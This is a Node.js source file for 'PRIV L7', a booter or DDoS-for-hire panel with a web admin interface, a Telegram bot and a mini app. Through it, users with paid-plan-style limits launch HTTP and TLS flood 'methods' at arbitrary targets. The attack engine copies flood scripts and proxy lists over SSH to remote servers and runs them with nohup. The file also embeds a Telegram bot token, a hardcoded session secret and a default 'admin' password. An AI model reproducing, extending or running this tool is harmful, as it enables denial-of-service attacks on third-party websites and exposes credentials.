#!/usr/bin/env node
'use strict';

/**
 * PRIV L7 — Unified Hub & Bot (Admin Panel + Mini App)
 */

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { spawn } = require('node:child_process');
const express = require('express');
const session = require('express-session');
const helmet = require('helmet');
const bcrypt = require('bcryptjs');
const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');

/* ---------- CONFIG ---------- */
const SCRIPT_DIR = __dirname;
const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '9165016422:AAFw5t2VKPmay2grvN4evutzyAAzkH-E75M',
  ADMIN_ID: process.env.ADMIN_ID || '7623976106', // فقط این آیدی به ربات دسترسی داره
  PORT: Number(process.env.PORT || 8443),
  SESSION_SECRET: 'priv-l7-super-secret-6767',
  DATA_DIR: path.join(SCRIPT_DIR, 'privflood-data'),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 20000,
};

if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true, mode: 0o700 });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');

if (!fs.existsSync(SERVERS_FILE)) fs.writeFileSync(SERVERS_FILE, '[]');

/* ---------- STORAGE (Force Admin Reset) ---------- */
const readJSON = (f, fb) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } };
const writeJSON = (f, d) => { const tmp = f + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(d, null, 2), { mode: 0o600 }); fs.renameSync(tmp, f); };

// اطمینان از وجود ادمین با پسورد پیش‌فرض admin
let users = readJSON(USERS_FILE, {});
if (!users['admin'] || !users['admin'].passwordHash) {
  users['admin'] = { passwordHash: bcrypt.hashSync('admin', 10), role: 'admin', limits: { maxDuration: 999, maxRate: 999, maxConcurrent: 99 } };
  writeJSON(USERS_FILE, users);
}

const loadUsers = () => readJSON(USERS_FILE, {});
const saveUsers = (u) => writeJSON(USERS_FILE, u);
const loadServers = () => readJSON(SERVERS_FILE, []);
const saveServers = (s) => writeJSON(SERVERS_FILE, s);

/* ---------- SSH & ATTACK ENGINE ---------- */
const serverConns = new Map();
const activeSessions = new Map();

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const t = setTimeout(() => { try { conn.end(); } catch {} reject(new Error('SSH timeout')); }, CONFIG.SSH_TIMEOUT);
    conn.once('ready', () => { clearTimeout(t); resolve(conn); });
    conn.once('error', (e) => { clearTimeout(t); reject(e); });
    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
      });
    } catch (e) { clearTimeout(t); reject(e); }
  });
}

function sshExec(conn, cmd, timeout = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'timeout' }); } }, timeout);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(t); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', er = '';
        stream.on('data', d => out += d);
        stream.stderr.on('data', d => er += d);
        stream.on('close', code => { clearTimeout(t); done = true; resolve({ code: code || 0, out, err: er }); });
      });
    } catch (e) { clearTimeout(t); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

async function getConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const s = loadServers().find(x => x.id === id);
  if (!s) throw new Error('Server not found');
  const conn = await sshConnect(s);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

async function ensureRemoteFiles(conn, methodFile) {
  const check = await sshExec(conn, `test -f ${CONFIG.REMOTE_DIR}/${methodFile} && test -f ${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE} && echo OK || echo NO`, 8000);
  if (check.out.includes('OK')) return;

  try {
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
    const localMethod = path.join(SCRIPT_DIR, methodFile);
    if (fs.existsSync(localMethod)) {
      await new Promise((res, rej) => {
        conn.sftp((err, sftp) => {
          if (err) return rej(err);
          sftp.fastPut(localMethod, `${CONFIG.REMOTE_DIR}/${methodFile}`, (e) => {
            sftp.end(); if (e) rej(e); else res();
          });
        });
      });
    }
    const localProxy = path.join(SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(localProxy)) {
      await new Promise((res, rej) => {
        conn.sftp((err, sftp) => {
          if (err) return rej(err);
          sftp.fastPut(localProxy, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`, (e) => {
            sftp.end(); if (e) rej(e); else res();
          });
        });
      });
    }
  } catch (e) { throw new Error('Sync failed: ' + e.message); }
}

const BUILTIN_METHODS = [
  { id: 'priv', name: 'Privflood', file: 'priv.js', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3]] },
  { id: 'crush', name: 'C-Rush', file: 'l.js', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3], '-c', '-h'] },
  { id: 'tls', name: 'TLS-Bypass', file: 'tls.js', parse: (a) => [a[0], a[1], a[3], a[2], CONFIG.PROXY_FILE] },
  { id: 'bypass', name: 'HTTP-Bypass', file: 'bypass.js', parse: (a) => ['GET', a[0], a[1], a[2], a[3], CONFIG.PROXY_FILE] },
];

function launchLocal(sessionId, methodFile, args) {
  const mp = path.join(SCRIPT_DIR, methodFile);
  if (!fs.existsSync(mp)) throw new Error(`Local file missing: ${methodFile}`);
  const child = spawn(process.execPath, [mp, ...args], { cwd: SCRIPT_DIR, detached: true, stdio: 'ignore', env: { PATH: process.env.PATH || '' } });
  activeSessions.set(sessionId + '_local', { type: 'local', pid: child.pid, timer: null });
  return child.pid;
}

async function launchRemote(sessionId, methodFile, args, serverId) {
  const server = loadServers().find(s => s.id === serverId);
  if (!server) throw new Error('Server not found');
  const conn = await getConn(serverId);
  await ensureRemoteFiles(conn, methodFile);

  const logFile = `/tmp/.atk_${sessionId}_${serverId}.log`;
  const cmd = `cd ${CONFIG.REMOTE_DIR} && nohup node ${methodFile} ${args.join(' ')} > ${logFile} 2>&1 & echo $!`;
  const r = await sshExec(conn, cmd, 15000);
  
  let pid = parseInt((r.out||'').trim().replace(/[^0-9]/g,''), 10);
  if (!pid) {
    const pg = await sshExec(conn, `pgrep -f "node ${methodFile}" | head -1`, 5000);
    pid = parseInt((pg.out||'').trim().replace(/[^0-9]/g,''), 10);
  }
  if (!pid) {
    const log = await sshExec(conn, `tail -5 ${logFile} 2>/dev/null || echo "No log"`, 5000);
    throw new Error(`${server.name}: ${(log.out||'').trim().slice(0,60)}`);
  }
  
  activeSessions.set(sessionId + '_' + serverId, { type: 'remote', serverId, pid, timer: null });
  return pid;
}

async function stopAttackSession(sessionId) {
  for (const [key, data] of activeSessions.entries()) {
    if (key.startsWith(sessionId)) {
      if (data.type === 'local') {
        try { process.kill(-data.pid, 'SIGKILL'); } catch (e) { try { process.kill(data.pid, 'SIGKILL'); } catch {} }
      } else if (data.type === 'remote') {
        try {
          const conn = await getConn(data.serverId);
          await sshExec(conn, `kill -9 ${data.pid} 2>/dev/null || true; pkill -9 -P ${data.pid} 2>/dev/null || true`, 5000);
        } catch {}
      }
      activeSessions.delete(key);
    }
  }
}

async function runAttack(methodId, target, duration, threads, rate) {
  const method = BUILTIN_METHODS.find(m => m.id === methodId);
  if (!method) throw new Error('Method not found');

  const args = method.parse([target, String(duration), String(threads), String(rate)]);
  const sessionId = 'sess_' + crypto.randomBytes(4).toString('hex');

  launchLocal(sessionId, method.file, args);
  const servers = loadServers().filter(s => s.status === 'online');
  let successCount = 1;
  
  const results = await Promise.allSettled(servers.map(s => launchRemote(sessionId, method.file, args, s.id)));
  results.forEach((r, i) => {
    if (r.status === 'fulfilled') successCount++;
    else console.error(`[attack] Server ${servers[i].name} failed: ${r.reason.message}`);
  });

  const t = setTimeout(() => stopAttackSession(sessionId), duration * 1000);
  for (const [k, v] of activeSessions.entries()) {
    if (k.startsWith(sessionId)) v.timer = t;
  }
  return { sessionId, launched: successCount, total: servers.length + 1 };
}

/* ---------- EXPRESS APP ---------- */
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://telegram.org"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'self'", "https://web.telegram.org", "https://*.telegram.org"],
    }
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: false,
  crossOriginOpenerPolicy: false
}));

app.use(express.json({ limit: '64kb' }));
app.use(express.urlencoded({ extended: false, limit: '64kb' }));

app.use(session({
  name: 'privhub.sid',
  secret: CONFIG.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  proxy: true,
  cookie: { httpOnly: true, sameSite: 'lax', secure: false, maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

function auth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Please sign in.' });
  const u = loadUsers()[req.session.user.username];
  if (!u) return req.session.destroy(() => res.status(401).json({ error: 'Account deleted.' }));
  req.user = u;
  req.username = req.session.user.username;
  next();
}

function adminOnly(req, res, next) {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
  next();
}

/* API ROUTES */
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const u = loadUsers()[username];
  if (!u || !(await bcrypt.compare(password, u.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    req.session.user = { username };
    res.json({ user: { username, role: u.role, limits: u.limits } });
  });
});

app.get('/api/me', auth, (req, res) => res.json({ user: { username: req.username, role: req.user.role, limits: req.user.limits } }));
app.post('/api/logout', auth, (req, res) => req.session.destroy(() => res.json({ ok: true })));

app.get('/api/stats', auth, (req, res) => {
  const servers = loadServers();
  const online = servers.filter(s => s.status === 'online').length;
  res.json({ servers: { online, total: servers.length }, limits: req.user.limits || {} });
});

app.get('/api/methods', auth, (req, res) => res.json(BUILTIN_METHODS.map(m => ({ id: m.id, name: m.name }))));

app.post('/api/attack', auth, async (req, res) => {
  const { methodId, target, duration, threads, rate } = req.body;
  const limits = req.user.limits || {};
  if (limits.maxDuration && duration > limits.maxDuration) return res.status(400).json({ error: `Max duration ${limits.maxDuration}s` });
  if (limits.maxRate && rate > limits.maxRate) return res.status(400).json({ error: `Max rate ${limits.maxRate}` });

  try {
    const result = await runAttack(methodId, target, duration, threads, rate);
    res.json({ ok: true, ...result });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/cancel', auth, async (req, res) => {
  const { sessionId } = req.body;
  await stopAttackSession(sessionId);
  res.json({ ok: true });
});

app.get('/api/admin/users', auth, adminOnly, (req, res) => {
  res.json(Object.keys(loadUsers()).map(u => ({ username: u, role: loadUsers()[u].role, limits: loadUsers()[u].limits })));
});

app.post('/api/admin/users', auth, adminOnly, async (req, res) => {
  const { action, username, password, maxDuration, maxRate } = req.body;
  const list = loadUsers();
  if (action === 'create') {
    if (list[username]) return res.status(400).json({ error: 'User exists' });
    list[username] = { passwordHash: await bcrypt.hash(password, 10), role: 'user', limits: { maxDuration: Number(maxDuration) || 60, maxRate: Number(maxRate) || 90 } };
    saveUsers(list); res.json({ ok: true });
  } else if (action === 'delete') {
    if (username === 'admin') return res.status(400).json({ error: 'Cannot delete admin' });
    delete list[username]; saveUsers(list); res.json({ ok: true });
  }
});

/* UI HTML */
const HTML = `
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="theme-color" content="#0a0a0c">
<title>PRIV L7</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
:root { --bg: #0a0a0c; --panel: #121216; --border: #1f1f24; --text: #ffffff; --muted: #8c8c93; --danger: #ef4444; --success: #22c55e; }
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
.nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(18,18,22,0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--border); z-index: 100; }
.nav-item { color: var(--muted); font-size: 24px; cursor: pointer; transition: 0.2s; }
.nav-item.active { color: var(--text); transform: scale(1.1); }
.header { padding: 20px; display: flex; justify-content: space-between; align-items: center; }
.logo { font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 8px; letter-spacing: 1px; }
.logo-dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }
.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 20px; margin-bottom: 20px; }
.box { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 16px; }
.box-label { font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 6px; font-weight: 700; letter-spacing: 0.5px; }
.box-val { font-size: 22px; font-weight: 700; }
.panel { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; margin: 0 20px 20px; padding: 20px; }
.field { margin-bottom: 15px; }
.field label { display: block; font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 8px; font-weight: 700; letter-spacing: 0.5px; }
.field input, .field select { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 14px; border-radius: 12px; font-size: 16px; outline: none; transition: 0.2s; }
.field input:focus, .field select:focus { border-color: var(--muted); }
.row { display: flex; gap: 12px; } .row > div { flex: 1; }
.btn { width: 100%; background: var(--text); color: var(--bg); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px; }
.btn:active { opacity: 0.8; }
.btn-danger { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239,68,68,0.3); }
#loginScreen { display: flex; flex-direction: column; justify-content: center; min-height: 100vh; padding: 20px; }
.login-box { background: var(--panel); border: 1px solid var(--border); padding: 30px; border-radius: 20px; }
.admin-user { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
.admin-user:last-child { border-bottom: none; }
.active-card { background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34,197,94,0.2); border-radius: 14px; padding: 16px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; animation: slideIn 0.3s ease; }
@keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
.active-card-info b { display: block; color: var(--success); margin-bottom: 4px; font-size: 15px; }
.active-card-info span { font-size: 12px; color: var(--muted); }
.hide { display: none !important; }
</style>
</head>
<body>

<div id="loginScreen">
  <div class="header"><div class="logo"><div class="logo-dot"></div>PRIV L7</div></div>
  <div class="login-box">
    <div class="field"><label>Username</label><input type="text" id="loginUser" placeholder="Enter username"></div>
    <div class="field"><label>Password</label><input type="password" id="loginPass" placeholder="Enter password"></div>
    <button class="btn" onclick="doLogin()">Sign In</button>
    <p style="color:var(--danger); font-size:12px; margin-top:10px; text-align:center;" id="loginErr"></p>
  </div>
</div>

<div id="mainApp" class="hide">
  <div id="tabHome">
    <div class="header"><div class="logo"><div class="logo-dot"></div>PRIV L7</div><div style="font-size:12px; color:var(--muted)" id="userTag">User</div></div>
    
    <div class="grid">
      <div class="box"><div class="box-label">Plan</div><div class="box-val" id="uPlan">Free</div></div>
      <div class="box"><div class="box-label">Concurrents</div><div class="box-val" id="uConc">1</div></div>
      <div class="box"><div class="box-label">Max Duration</div><div class="box-val" id="uDur">60s</div></div>
      <div class="box"><div class="box-label">Servers</div><div class="box-val" id="uServers">0/0</div></div>
    </div>

    <div class="panel hide" id="activePanel">
      <div style="display:flex; justify-content:space-between; font-size:12px; font-weight:700; color:var(--muted); margin-bottom:10px;">
        <span>● ACTIVE ATTACK</span><span id="activeTimer">Running</span>
      </div>
      <div class="active-card">
        <div class="active-card-info">
          <b id="activeTarget">target.com</b>
          <span id="activeMethod">C-Rush</span>
        </div>
        <button class="btn btn-danger" style="width:auto; padding:10px 18px; margin:0; border-radius:8px;" onclick="cancelActive()">Cancel</button>
      </div>
    </div>

    <div class="panel">
      <div class="field"><label>Method</label><select id="attMethod"></select></div>
      <div class="field"><label>Target</label><input type="text" id="attTarget" placeholder="ex: google.com"></div>
      <div class="row">
        <div class="field"><label>Time (s)</label><input type="number" id="attTime" value="60"></div>
        <div class="field"><label>Threads</label><input type="number" id="attThreads" value="16"></div>
      </div>
      <div class="row">
        <div class="field"><label>Rate</label><input type="number" id="attRate" value="90"></div>
        <div class="field"><label>Port</label><input type="number" id="attPort" value="443"></div>
      </div>
      <button class="btn" id="btnLaunch" onclick="launchAttack()"><span id="btnIcon">🚀</span> <span id="btnText">Launch Attack</span></button>
    </div>
  </div>

  <div id="tabAdmin" class="hide">
    <div class="header"><div class="logo">Admin Panel</div></div>
    <div class="panel">
      <h3 style="margin-bottom:15px; font-size:16px;">Create User</h3>
      <div class="field"><label>Username</label><input type="text" id="admUser"></div>
      <div class="field"><label>Password</label><input type="text" id="admPass"></div>
      <div class="row">
        <div class="field"><label>Max Time (s)</label><input type="number" id="admDur" value="60"></div>
        <div class="field"><label>Max Rate</label><input type="number" id="admRate" value="90"></div>
      </div>
      <button class="btn" onclick="createUser()">Create Account</button>
    </div>
    <div class="panel"><h3 style="margin-bottom:15px; font-size:16px;">Manage Users</h3><div id="userList"></div></div>
  </div>

  <div class="nav">
    <div class="nav-item active" onclick="switchTab('Home')">⌂</div>
    <div class="nav-item hide" onclick="switchTab('Admin')" id="navAdmin">☰</div>
    <div class="nav-item" onclick="logout()">✖</div>
  </div>
</div>

<script>
  let methods = [];
  let currentSessionId = null;
  const tg = window.Telegram?.WebApp;
  
  if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor('#0a0a0c'); }

  async function api(endpoint, opts = {}) {
    const res = await fetch(endpoint, { 
      ...opts, 
      headers: { 'Content-Type': 'application/json', ...opts.headers },
      credentials: 'include'
    });
    const contentType = res.headers.get("content-type");
    if (contentType && contentType.indexOf("application/json") === -1) {
      throw new Error("Server returned HTML error. Check backend logs.");
    }
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Error');
    return data;
  }

  async function doLogin() {
    const u = document.getElementById('loginUser').value;
    const p = document.getElementById('loginPass').value;
    document.getElementById('loginErr').innerText = '';
    try {
      await api('/api/login', { method: 'POST', body: JSON.stringify({username: u, password: p}) });
      showApp();
    } catch(e) { document.getElementById('loginErr').innerText = e.message; }
  }

  async function logout() {
    try { await api('/api/logout', { method: 'POST' }); } catch(e){}
    location.reload();
  }

  async function showApp() {
    document.getElementById('loginScreen').classList.add('hide'); 
    document.getElementById('mainApp').classList.remove('hide');
    try {
      const me = await api('/api/me');
      if (me.user.role === 'admin') document.getElementById('navAdmin').classList.remove('hide');
      document.getElementById('userTag').innerText = me.user.role;
      
      methods = await api('/api/methods'); 
      renderMethods(); 
      fetchStats(); 
      setInterval(fetchStats, 5000);
    } catch(e) { console.error(e); }
  }

  api('/api/me').then(() => showApp()).catch(() => {});

  function renderMethods() {
    document.getElementById('attMethod').innerHTML = methods.map(m => '<option value="' + m.id + '">' + m.name + '</option>').join('');
  }
  
  async function fetchStats() {
    try {
      const d = await api('/api/stats');
      document.getElementById('uPlan').innerText = d.limits.maxDuration > 120 ? 'Pro' : 'Free';
      document.getElementById('uConc').innerText = d.limits.maxConcurrent || 1;
      document.getElementById('uDur').innerText = (d.limits.maxDuration || 60) + 's';
      document.getElementById('uServers').innerText = d.servers.online + '/' + d.servers.total;
    } catch(e) {}
  }

  async function launchAttack() {
    const btn = document.getElementById('btnLaunch'); 
    const icon = document.getElementById('btnIcon');
    const txt = document.getElementById('btnText');
    btn.disabled = true; txt.innerText = 'Sending...'; icon.innerText = '⏳';
    
    try {
      const res = await api('/api/attack', { method: 'POST', body: JSON.stringify({
        methodId: document.getElementById('attMethod').value, 
        target: document.getElementById('attTarget').value,
        duration: Number(document.getElementById('attTime').value), 
        threads: Number(document.getElementById('attThreads').value),
        rate: Number(document.getElementById('attRate').value)
      })});
      
      currentSessionId = res.sessionId;
      document.getElementById('activePanel').classList.remove('hide');
      document.getElementById('activeTarget').innerText = document.getElementById('attTarget').value;
      
      var m = methods.find(x => x.id === document.getElementById('attMethod').value);
      document.getElementById('activeMethod').innerText = m ? m.name : 'Method';
      
      if (tg) tg.HapticFeedback.notificationOccurred('success');
      txt.innerText = "Launched (" + res.launched + "/" + res.total + ")"; icon.innerText = '✅';
      
      setTimeout(() => { txt.innerText = 'Launch Attack'; icon.innerText = '🚀'; btn.disabled = false; }, 3000);
    } catch(e) { 
      if (tg) tg.showAlert(e.message); else alert(e.message); 
      txt.innerText = 'Launch Attack'; icon.innerText = '🚀'; btn.disabled = false;
    }
  }

  async function cancelActive() {
    if (!currentSessionId) return;
    try {
      await api('/api/cancel', { method: 'POST', body: JSON.stringify({ sessionId: currentSessionId }) });
      document.getElementById('activePanel').classList.add('hide');
      currentSessionId = null;
      if (tg) tg.HapticFeedback.notificationOccurred('warning');
    } catch(e) { alert(e.message); }
  }

  function switchTab(t) {
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('tabHome').classList.add('hide'); document.getElementById('tabAdmin').classList.add('hide');
    if (t === 'Home') { 
      document.getElementById('tabHome').classList.remove('hide'); 
      document.querySelectorAll('.nav-item')[0].classList.add('active'); 
    } else { 
      document.getElementById('tabAdmin').classList.remove('hide'); 
      document.querySelectorAll('.nav-item')[1].classList.add('active'); 
      loadAdminUsers(); 
    }
  }

  async function createUser() {
    try {
      await api('/api/admin/users', { method: 'POST', body: JSON.stringify({
        action: 'create', username: document.getElementById('admUser').value, password: document.getElementById('admPass').value,
        maxDuration: document.getElementById('admDur').value, maxRate: document.getElementById('admRate').value
      })});
      if (tg) tg.showAlert('User created'); else alert('User created');
      loadAdminUsers();
    } catch(e) { alert(e.message); }
  }

  async function loadAdminUsers() {
    try {
      const list = await api('/api/admin/users');
      document.getElementById('userList').innerHTML = list.map(u => {
        return '<div class="admin-user"><div><b>' + u.username + '</b><br><span>Time:' + u.limits.maxDuration + 's Rate:' + u.limits.maxRate + '</span></div>' +
               '<button onclick="deleteUser(\'' + u.username + '\')" style="background:none;border:none;color:var(--danger);font-weight:600;cursor:pointer;">Delete</button></div>';
      }).join('');
    } catch(e) {}
  }

  async function deleteUser(u) { 
    if(!confirm('Delete ' + u + '?')) return; 
    await api('/api/admin/users', { method: 'POST', body: JSON.stringify({action:'delete', username:u}) }); 
    loadAdminUsers(); 
  }
</script>
</body>
</html>`;

app.get('/', (req, res) => res.type('html').send(HTML));
app.use((err, req, res, next) => res.status(500).json({ error: 'Server error' }));

/* ---------- TELEGRAM BOT (Admin Only) ---------- */
let TUNNEL_URL = '';

function startTunnel() {
  const cf = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${CONFIG.PORT}`]);
  cf.stderr.on('data', (data) => {
    const match = data.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
    if (match && TUNNEL_URL !== match[0]) {
      TUNNEL_URL = match[0];
      console.log(`\n[✅] MINI APP URL READY: ${TUNNEL_URL}\n`);
    }
  });
  cf.on('close', () => setTimeout(startTunnel, 5000));
}

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

// دستورات ربات فقط برای ادمین
bot.onText(/\/start/, (msg) => {
  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) {
    if (!TUNNEL_URL) return bot.sendMessage(msg.chat.id, '⏳ Connecting... try again in 5s.');
    return bot.sendMessage(msg.chat.id, `Welcome to PRIV L7.\nClick below to open the panel.`, {
      reply_markup: { inline_keyboard: [[{ text: "Open Hub 🚀", web_app: { url: TUNNEL_URL } }]] }
    });
  }

  const adminKeyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🖥 Open Web Panel", web_app: { url: TUNNEL_URL || "https://t.me" } }],
        [{ text: "📊 Server Stats", callback_data: "stats" }]
      ]
    }
  };
  bot.sendMessage(msg.chat.id, `👑 Welcome Admin.\nUse the panel below or type commands:\n\n/attack <method> <target> <time> <threads> <rate>\n/users\n/cancel`, adminKeyboard);
});

// دستور /attack
bot.onText(/\/attack (.+)/, async (msg, match) => {
  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) return;
  const parts = match[1].split(' ');
  if (parts.length < 5) return bot.sendMessage(msg.chat.id, '⚠️ Usage: /attack <method> <target> <time> <threads> <rate>');
  
  const [method, target, time, threads, rate] = parts;
  bot.sendMessage(msg.chat.id, `🚀 Launching ${method} on ${target}...`);
  
  try {
    const res = await runAttack(method, target, Number(time), Number(threads), Number(rate));
    bot.sendMessage(msg.chat.id, `✅ Attack launched on ${res.launched}/${res.total} nodes.`);
  } catch (e) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${e.message}`);
  }
});

// دستور /users
bot.onText(/\/users/, (msg) => {
  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) return;
  const list = loadUsers();
  let text = '👥 **Registered Users:**\n\n';
  for (const [u, data] of Object.entries(list)) {
    text += `👤 \`${u}\` | Role: ${data.role}\n`;
  }
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// دستور /cancel
bot.onText(/\/cancel/, (msg) => {
  if (msg.from.id.toString() !== CONFIG.ADMIN_ID) return;
  for (const key of activeSessions.keys()) {
    const sessionId = key.split('_')[0] + '_' + key.split('_')[1];
    stopAttackSession(sessionId);
  }
  bot.sendMessage(msg.chat.id, '🛑 All active attacks cancelled.');
});

app.listen(CONFIG.PORT, () => {
  console.log(`[hub] Web server listening on port ${CONFIG.PORT}`);
  startTunnel();
});
